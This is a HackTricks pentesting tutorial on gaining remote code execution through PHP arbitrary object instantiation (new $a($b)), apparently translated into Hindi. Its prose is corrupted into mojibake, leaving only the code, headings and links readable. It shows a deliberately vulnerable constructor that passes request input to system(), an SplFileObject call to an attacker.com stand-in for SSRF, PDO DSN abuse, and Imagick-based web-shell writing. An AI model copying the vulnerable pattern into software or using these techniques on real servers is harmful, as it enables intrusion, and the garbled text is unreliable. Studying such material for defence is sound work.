# PHP - RCE рд╡рд╕реНрддреБ рдирд┐рд░реНрдорд╛рдг рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ: new $\_GET\["a"]\($\_GET\["b"])

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

- рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!

- рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)

- рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ рдореБрдЭреЗ **Twitter** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рдХреЛ [hacktricks рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред**

</details>

## рдкрд░рд┐рдЪрдп

рдЬрд╣рд╛рдВ рдЖрдк `new $_GET["a"]($_GET["a"])` рдЬреИрд╕реЗ рдПрдХ рдирдпрд╛ рд╡рд┐рдЪрд┐рддреНрд░ рд╡рд╕реНрддреБ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ, рдЖрдк RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ [**рдЗрд╕ рд▓реЗрдЦ**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) рдореЗрдВ рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХреЛрдВ рдХреЛ рдкреНрд░рдХрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдЬрд┐рдирд╕реЗ RCE рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

## рдХрд╕реНрдЯрдо рдХрдХреНрд╖рд╛рдУрдВ рдпрд╛ рдСрдЯреЛрд▓реЛрдбрд┐рдВрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ RCE

рдирд┐рд░реНрдорд╛рдг `new $a($b)` рдореЗрдВ, **рдЪрд░ `$a` рдХрдХреНрд╖рд╛ рдХрд╛ рдирд╛рдо** рджрд░реНрд╢рд╛рддрд╛ рд╣реИ рдЬрд┐рд╕рдХреЗ рд▓рд┐рдП рд╡рд╕реНрддреБ рдмрдирд╛рдИ рдЬрд╛рдПрдЧреА, рдФрд░ рдЪрд░ **`$b` рд╡рд╣ рдкрд╣рд▓рд╛ рддрд░реНрдХ рд╣реИ** рдЬреЛ рд╡рд╕реНрддреБ рдХреЗ рдирд┐рд░реНрдорд╛рдгрдХрд░реНрддрд╛ рдХреЛ рдкрд╛рд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

рдпрджрд┐ `$a` рдФрд░ `$b` GET/POST рд╕реЗ рдЖрддреЗ рд╣реИрдВ, рддреЛ рд╡реЗ **рд╕реНрдЯреНрд░рд┐рдВрдЧ рдпрд╛ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдПрд░реЗ** рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рд╡реЗ **JSON** рдпрд╛ рдХрд╣реАрдВ рдФрд░ рд╕реЗ рдЖрддреЗ рд╣реИрдВ, рддреЛ рдЙрдирдореЗрдВ **рдЕрдиреНрдп рдкреНрд░рдХрд╛рд░** рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐ рд╡рд╕реНрддреБ рдпрд╛ рдмреВрд▓рд┐рдпрдиред

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдХреЛ рд╡рд┐рдЪрд╛рд░ рдХрд░реЗрдВ:
```php
class App {
function __construct ($cmd) {
system($cmd);
}
}

# Additionally, in PHP < 8.0 a constructor might be defined using the name of the class
class App2 {
function App2 ($cmd) {
system($cmd);
}
}

# Vulnerable code
$a = $_GET['a'];
$b = $_GET['b'];

new $a($b);
```
рдЗрд╕ рдХреЛрдб рдореЗрдВ, рдЖрдк  `$a`  рдХреЛ  `App`  рдпрд╛  `App2`  рдкрд░ рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░  `$b`  рдХреЛ  `uname -a`  рдкрд░ рд╕реЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рдХреЗ рдмрд╛рдж, рдХрдорд╛рдВрдб  `uname -a`  рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ред

рдЬрдм рдЖрдкрдХреЗ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдРрд╕реА рдХреЛрдИ рднреА рдЕрдзрд┐рдХрд╛рд░реАрдд рдХреНрд▓рд╛рд╕реЗрд╕ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИрдВ, рдпрд╛ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЖрд╡рд╢реНрдпрдХ рдХреНрд▓рд╛рд╕ рдПрдХ рдЕрд▓рдЧ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рд╣реЛрддреА рд╣реИ рдЬрд┐рд╕реЗ рд╡рд┐рдХрд▓реНрдкреАрдп рдХреЛрдб рджреНрд╡рд╛рд░рд╛ рд╕рдореНрдорд┐рд▓рд┐рдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЖрдк рдСрдЯреЛрд▓реЛрдбрд┐рдВрдЧ рдлрд╝рдВрдХреНрд╢рдиреНрд╕ рдкрд░ рдирдЬрд╝рд░ рдбрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВред

**рдСрдЯреЛрд▓реЛрдбрд┐рдВрдЧ рдлрд╝рдВрдХреНрд╢рдиреНрд╕** рдХреЛ `spl_autoload_register` рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдХреЙрд▓рдмреИрдХреНрд╕ рдХреЛ рд░рдЬрд┐рд╕реНрдЯрд░ рдХрд░рдХреЗ рдпрд╛ `__autoload` рдХреЛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рдХреЗ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпреЗ рд╡рд╣реА рд╕рдордп рдкрд░ рдХреЙрд▓ рдХрд┐рдП рдЬрд╛рддреЗ рд╣реИрдВ рдЬрдм рдПрдХ рдЕрдЬреНрдЮрд╛рдд рдХреНрд▓рд╛рд╕ рдХреА рдПрдХ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдмрдирд╛рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХреА рдЬрд╛ рд░рд╣реА рд╣реЛрддреА рд╣реИред
```php
# An example of an autoloading function
spl_autoload_register(function ($class_name) {
include './../classes/' . $class_name . '.php';
});

# An example of an autoloading function, works only in PHP < 8.0
function __autoload($class_name) {
include $class_name . '.php';
};

# Calling spl_autoload_register with no arguments enables the default autoloading function, which includes lowercase($classname) + .php/.inc from include_path
spl_autoload_register();
```
рдЖрдкрдХреЗ рдкрд╛рд╕ PHP рд╕рдВрд╕реНрдХрд░рдг рдФрд░ рдСрдЯреЛрд▓реЛрдбрд┐рдВрдЧ рдлрд╝рдВрдХреНрд╢рди рдореЗрдВ рдХреЛрдб рдХреЗ рдЖрдзрд╛рд░ рдкрд░, рдСрдЯреЛрд▓реЛрдбрд┐рдВрдЧ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд░рд┐рдореЛрдЯ рдХреЛрдб рдПрдХреНрд╕реАрдХреНрдпреВрд╢рди рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рдХреБрдЫ рддрд░реАрдХреЗ рдореМрдЬреВрдж рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред

## рдмрд┐рд▓реНрдЯ-рдЗрди рдХреНрд▓рд╛рд╕ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ RCE

рдЬрдм рдЖрдкрдХреЗ рдкрд╛рд╕ рдХрд╕реНрдЯрдо рдХреНрд▓рд╛рд╕ рдФрд░ рдСрдЯреЛрд▓реЛрдбрд┐рдВрдЧ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ, рддреЛ рдЖрдк **рдХреЗрд╡рд▓ рдмрд┐рд▓реНрдЯ-рдЗрди PHP рдХреНрд▓рд╛рд╕реЛрдВ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред

PHP рд╕рдВрд╕реНрдХрд░рдг рдФрд░ рд╕реНрдерд╛рдкрд┐рдд рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рдЖрдзрд╛рд░ рдкрд░ 100 рд╕реЗ 200 рддрдХ рдмрд┐рд▓реНрдЯ-рдЗрди PHP рдХреНрд▓рд╛рд╕реЗрдВ рд╣реЛрддреА рд╣реИрдВред рд╕рднреА рдмрд┐рд▓реНрдЯ-рдЗрди рдХреНрд▓рд╛рд╕реЗрдВ `get_declared_classes` рдлрд╝рдВрдХреНрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╕реВрдЪреАрдмрджреНрдз рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВ, рдХрд╕реНрдЯрдо рдХреНрд▓рд╛рд╕реЛрдВ рдХреЗ рд╕рд╛рде:
```php
var_dump(get_declared_classes());
```
рдХрд╛рд░рдгреЛрдВ рдХреЗ рд▓рд┐рдП [рдкреНрд░рддрд┐рдмрд┐рдВрдмрди API](https://www.php.net/manual/en/book.reflection.php) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдкрдпреЛрдЧреА рдХрдВрд╕реНрдЯреНрд░рдХреНрдЯрд░ рд╡рд╛рд▓реА рдХрдХреНрд╖рд╛рдПрдВ рдвреВрдВрдврд╝реА рдЬрд╛ рд╕рдХрддреА рд╣реИрдВред

рдкреНрд░рддрд┐рдмрд┐рдВрдмрди API рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрдВрд╕реНрдЯреНрд░рдХреНрдЯрд░ рдФрд░ рдЙрдирдХреЗ рдкреИрд░рд╛рдореАрдЯрд░реЛрдВ рдХреЛ рдкреНрд░рджрд░реНрд╢рд┐рдд рдХрд░рдирд╛: [https://3v4l.org/2JEGF](https://3v4l.org/2JEGF)\


![](https://swarm.ptsecurity.com/wp-content/uploads/2022/07/2.png)

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рдПрдХрд╛рдзрд┐рдХ рдХрдВрд╕реНрдЯреНрд░рдХреНрдЯрд░ рдкреИрд░рд╛рдореАрдЯрд░ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реИ рдФрд░ рдЙрд╕рдХреЗ рдмрд╛рдж рдХрд┐рд╕реА рднреА рд╡рд┐рдЪрд╛рд░рд╣реАрди рд╡рд┐рдзрд┐ рдХреЛ рдХреЙрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**, рддреЛ рд░рд┐рдореЛрдЯ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрди рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рдХрдИ рддрд░реАрдХреЗ рд╣реИрдВред рд▓реЗрдХрд┐рди рдпрджрд┐ рдЖрдк **рдХреЗрд╡рд▓ рдПрдХ рдкреИрд░рд╛рдореАрдЯрд░ рдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдирд┐рд░реНрдорд┐рдд рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдХреЛрдИ рдХреЙрд▓ рдирд╣реАрдВ рд╣реИ**, рддреЛ рд╡рд╣рд╛рдВ **рд▓рдЧрднрдЧ рдХреБрдЫ рдирд╣реАрдВ** рд╣реИред

рдореБрдЭреЗ `new $a($b)` рд╕реЗ рдХреБрдЫ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХреЗрд╡рд▓ рддреАрди рддрд░реАрдХреЗ рдкрддрд╛ рд╣реИред

### **SSRF + Phar рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди**

`SplFileObject` рдХрдХреНрд╖рд╛ рдПрдХ рдХрдВрд╕реНрдЯреНрд░рдХреНрдЯрд░ рдХреЛ рд▓рд╛рдЧреВ рдХрд░рддреА рд╣реИ рдЬреЛ рдХрд┐рд╕реА рднреА рд╕реНрдерд╛рдиреАрдп рдпрд╛ рджреВрд░рд╕реНрде URL рд╕реЗ рдХрдиреЗрдХреНрд╢рди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ:
```
new SplFileObject('http://attacker.com/');
```
рдпрд╣ SSRF рдХреЛ рд╕рдВрднрд╡ рдмрдирд╛рддрд╛ рд╣реИред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, PHP < 8.0 рдореЗрдВ SSRF рдХреЛ Phar рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рд╕рд╛рде рддрдХрдиреАрдХреЛрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдбрд┐рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝реЗрд╢рди рдореЗрдВ рдмрджрд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

### **PDOs рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдирд╛**

PDO рдХрдХреНрд╖рд╛ рдореЗрдВ рдПрдХ рдФрд░ рджрд┐рд▓рдЪрд╕реНрдк рдирд┐рд░реНрдорд╛рддрд╛ рд╣реЛрддрд╛ рд╣реИ:
```php
new PDO("sqlite:/tmp/test.txt")
```
`PDO` рдХрдВрд╕реНрдЯреНрд░рдХреНрдЯрд░ DSN рд╕реНрдЯреНрд░рд┐рдВрдЧреНрд╕ рд╕реНрд╡реАрдХрд╛рд░ рдХрд░рддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╣рдо **рд╕реНрдерд╛рдиреАрдп рдпрд╛ рджреВрд░рд╕реНрде рдбреЗрдЯрд╛рдмреЗрд╕** рд╕реЗ **рд╕рдВрдкрд░реНрдХ рд╕реНрдерд╛рдкрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ** рдЙрдкрдпреБрдХреНрдд рдбреЗрдЯрд╛рдмреЗрд╕ рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, SQLite рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдЦрд╛рд▓реА рдлрд╝рд╛рдЗрд▓реЗрдВ рдмрдирд╛ рд╕рдХрддрд╛ рд╣реИред

### **SoapClient/SimpleXMLElement XXE**

PHP тЙд 5.3.22 рдФрд░ тЙд 5.4.12 рдореЗрдВ, SoapClient рдХрд╛ рдХрдВрд╕реНрдЯреНрд░рдХреНрдЯрд░ **XXE рдХреЗ рд▓рд┐рдП рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрдд рдерд╛**ред SimpleXMLElement рдХрд╛ рдХрдВрд╕реНрдЯреНрд░рдХреНрдЯрд░ рднреА XXE рдХреЗ рд▓рд┐рдП рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрдд рдерд╛, рд▓реЗрдХрд┐рди рдЗрд╕рдХреЗ рд▓рд┐рдП libxml2 < 2.9 рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рдереАред

## Imagick рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ RCE

рдЖрдкрдХреЛ рдЙрддреНрдкрд╛рдж рдХреА **рдЖрд╡рд╢реНрдпрдХрддрд╛рдУрдВ** рдХреА рдЬрд╛рдВрдЪ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП рдЬрд┐рд╕реЗ рдЖрдк рдЙрддреНрдкрд╛рдж рдХреЛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд░рд╣реЗ рд╣реИрдВ, рдЖрдкрдХреЛ рдирдП рдХрдХреНрд╖рд╛рдУрдВ рдХреЛ рдорд┐рд▓ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рдирдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдХрдорд╛рдВрдбреНрд╕ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ, рдЗрдореЗрдЬрд┐рдХ рдЙрд╕ рдЙрджреНрджреЗрд╢реНрдп рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧреА рдкрд╛рдпрд╛ рдЧрдпрд╛ рдерд╛ред

### VID рдкрд╛рд░реНрд╕рд░

VID рдкрд╛рд░реНрд╕рд░ рдлрд╝рд╛рдЗрд▓рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдЕрдВрджрд░ рдХрд┐рд╕реА рднреА рдорд╛рдирд╡реАрдп рдорд╛рд░реНрдЧ рдореЗрдВ рдПрдХ рдЕрдирд┐рд╡рд╛рд░реНрдп рд╕рд╛рдордЧреНрд░реА рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рд╕реЗ рд╣рдорд▓рд╛рд╡рд╛рд░ рдХреЛ рд╡реЗрдм рдкреГрд╖реНрда рд╕реЗ рдкрд╣реБрдВрдЪрдиреЗ рдпреЛрдЧреНрдп рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдПрдХ PHPshell рд▓рд┐рдЦрдиреЗ рдФрд░ RCE рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рд╣реЛрддреА рд╣реИред

![](<../../../.gitbook/assets/image (157) (3).png>)

#### VID рдкрд╛рд░реНрд╕рд░ + рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб

рдЬрдм PHP рдореЗрдВ рдПрдХ рдлрд╝рд╛рдЗрд▓ рдЕрдкрд▓реЛрдб рдХреА рдЬрд╛рддреА рд╣реИ, рддреЛ рдпрд╣ рдЕрд╕реНрдерд╛рдпреА рд░реВрдк рд╕реЗ `/tmp/phpXXXXXX` рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдХреА рдЬрд╛рддреА рд╣реИред Imagick рдХрд╛ VID рдкрд╛рд░реНрд╕рд░ **msl** рдкреНрд░реЛрдЯреЛрдХреЙрд▓ рдХреЗ рд╕рд╛рде рдлрд╝рд╛рдЗрд▓ рдкрде рдореЗрдВ **рд╡рд╛рдЗрд▓реНрдбрдХрд╛рд░реНрдб рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ** (рддрд╛рдХрд┐ рдЕрд╕реНрдерд╛рдпреА рдЕрдкрд▓реЛрдб рдХреА рдЧрдИ рдлрд╝рд╛рдЗрд▓ рдЖрд╕рд╛рдиреА рд╕реЗ рдкрд╣реБрдВрдЪреА рдЬрд╛ рд╕рдХреЗ) рдФрд░ рдЗрд╕реЗ рдХрд┐рд╕реА рднреА рдЕрдирд┐рд╡рд╛рд░реНрдп рд╕реНрдерд╛рди рдкрд░ **рдХреЙрдкреА рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред\
рдпрд╣ рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдХреЗ рдЕрдВрджрд░ рдЕрдирд┐рд╡рд╛рд░реНрдп рдлрд╝рд╛рдЗрд▓ рд▓реЗрдЦрди рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдФрд░ рддрд░реАрдХрд╛ рд╣реИ:

![](<../../../.gitbook/assets/image (159).png>)

### PHP рдХреНрд░реИрд╢ + рдмреНрд░реВрдЯ рдлрд╝реЛрд░реНрд╕

[**рдореВрд▓ рд▓реЗрдЦ**](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/) рдореЗрдВ рдПрдХ рдФрд░ рддрд░реАрдХрд╛ рдмрддрд╛рдпрд╛ рдЧрдпрд╛ рдерд╛ рдЬрд┐рд╕рд╕реЗ **рдирд┐рд╢реНрдЪрд┐рдд рд╕рд╛рдордЧреНрд░реА рд╡рд╛рд▓реА рдлрд╝рд╛рдЗрд▓реЗрдВ рдЕрдкрд▓реЛрдб рдХреА рдЬрд╛ рд╕рдХрддреА рдереАрдВ** рдФрд░ рд╕рд░реНрд╡рд░ **рдЙрд╕ рдлрд╝рд╛рдЗрд▓ рдХреЛ рд╣рдЯрд╛рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдХреНрд░реИрд╢ рд╣реЛ рдЬрд╛рддрд╛ рдерд╛** рдФрд░ рдлрд┐рд░ **рдЕрд╕реНрдерд╛рдпреА рдлрд╝рд╛рдЗрд▓ рдХреЗ рдирд╛рдо рдХреЛ рдмреНрд░реВрдЯрдлрд╝реЛрд░реНрд╕ рдХрд░рдХреЗ** Imagick рджреНрд╡рд╛рд░рд╛ рдЕрдирд┐рд╡рд╛рд░реНрдп PHP рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рдерд╛ред

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЬрд╛рд╣рд┐рд░ рд╣реИ рдХрд┐ **рдХреНрд░реИрд╢ рдЯреНрд░рд┐рдХ** рдХреЗрд╡рд▓ **рдкреБрд░рд╛рдиреЗ рд╕рдВрд╕реНрдХрд░рдг рдХреЗ ImageMagick рдореЗрдВ рдХрд╛рдо рдХрд░рддрд╛ рдерд╛**ред

## рд╕рдВрджрд░реНрдн

* [https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/](https://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

- рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдк **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб** рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!

- рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣

- рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks swag**](https://peass.creator-spring.com)

- **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)** рдХрд╛** **рдЕрдиреБрд╕рд░рдг рдХрд░реЗрдВред**

- **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, [hacktricks рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud рд░реЗрдкреЛ](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ рдкреАрдЖрд░ рдЬрдорд╛ рдХрд░рдХреЗ**ред

</details>
